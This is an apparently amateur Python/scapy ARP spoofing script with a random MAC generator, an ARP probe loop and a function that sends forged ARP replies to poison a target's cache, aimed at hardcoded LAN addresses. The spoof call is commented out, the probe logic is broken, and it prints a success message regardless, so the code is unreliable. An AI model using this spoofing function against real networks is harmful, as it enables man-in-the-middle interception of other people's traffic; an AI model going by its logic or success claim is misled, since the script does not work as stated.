import scapy.all as scapy
import time
import random

def random_bytes(num=6):
    return [random.randrange(256) for _ in range(num)]

def generate_mac(uaa=False, multicast=False, oui=None, separator=':', byte_fmt='%02x'):
    mac = random_bytes()
    if oui:
        if type(oui) == str:
            oui = [int(chunk) for chunk in oui.split(separator)]
        mac = oui + random_bytes(num=6-len(oui))
    else:
        if multicast:
            mac[0] |= 1 # set bit 0
        else:
            mac[0] &= ~1 # clear bit 0
        if uaa:
            mac[0] &= ~(1 << 1) # clear bit 1
        else:
            mac[0] |= 1 << 1 # set bit 1
    return separator.join(byte_fmt % b for b in mac)


def get_mac(ip):
    a=True
    count =0

    while a:
        print(f"{count} : TRY")
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        check = str(answered_list.show())
        count += 1


        if check!="None":
            a=False













def spoof(target_ip, spoof_ip ,smac , vmac):
    smac= str(smac)
    vmac= str(vmac)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=vmac, hwsrc = smac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)


target_ip = "192.168.1.101"  # Enter your target IP
gateway_ip = "192.168.1.1"  # Enter your gateway's IP

try:
    #print("[!! Arp Spoofer Start !!]")
    #sourcemac = generate_mac()
    #print(f"My spoofer Mac Address is : {sourcemac}")
    get_mac(target_ip)
    #print(f"My Victim Mac Address is : {victim_mac}")
    #print(victim_mac)


    #spoof(target_ip, gateway_ip, sourcemac, victim_mac)
    print("[+] Arp Spoof Work Successfully !!")
except :
    print("[-] Arp Spoof Stopped")
